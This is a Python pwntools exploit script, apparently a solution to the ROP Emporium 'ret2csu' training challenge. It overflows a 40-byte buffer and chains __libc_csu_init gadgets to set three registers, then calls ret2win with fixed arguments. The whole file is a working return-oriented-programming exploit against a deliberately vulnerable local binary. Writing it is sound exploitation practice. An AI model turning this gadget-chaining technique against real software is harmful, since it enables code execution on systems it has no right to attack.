import pwn
import time
import sys

elf = pwn.context.binary = pwn.ELF('./ret2csu')
io = elf.process()
pwn.gdb.attach(io)

time.sleep(3)
#RDI
popRDI = pwn.p64(0x4006a3)
#R14->RSI
#R15->RDX
#pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
largePOP = pwn.p64(0x40069a) 
#mov rdx, r15; mov rsi, r14; mov edi, r13D; call qword pt [R12 + RBX *0x8];
callAddr = pwn.p64(0x400680)
retAddr = pwn.p64(0x4004e6)
callGadget = pwn.p64(0x400689)
winAddr = pwn.p64(elf.plt['ret2win'])
offset = 40
param1 = 0xdeadbeefdeadbeef
param2 = 0xcafebabecafebabe
param3 = 0xd00df00dd00df00d
uselessFun = pwn.p64(elf.got['.fini'])
io.recv(1000)
payload = b"".join(
    [
        b'A'*offset,
        #Ret
        #param1->RDI
        #param2->R14
        #param3->r15
        #winAddr->r12
        #0->RBX
        retAddr,
        largePOP,
        pwn.p64(0),#->RBX
        pwn.p64(1),#->RBP
        uselessFun,   #->r12
        pwn.p64(param1),#->r13
        pwn.p64(param2),#->r14
        pwn.p64(param3),#->r15
        #RDI = param1, RBX = 0; R12 = WinAddr, R14 = param2, R15 = param3
        callAddr,
        pwn.p64(0x0),
        pwn.p64(0x0),
        pwn.p64(0x0),
        pwn.p64(0x0),
        pwn.p64(0x0),
        pwn.p64(0x0),
        pwn.p64(0x0),
        popRDI,
        pwn.p64(param1),
        winAddr
    ]
)
io.sendline(payload)
io.interactive()
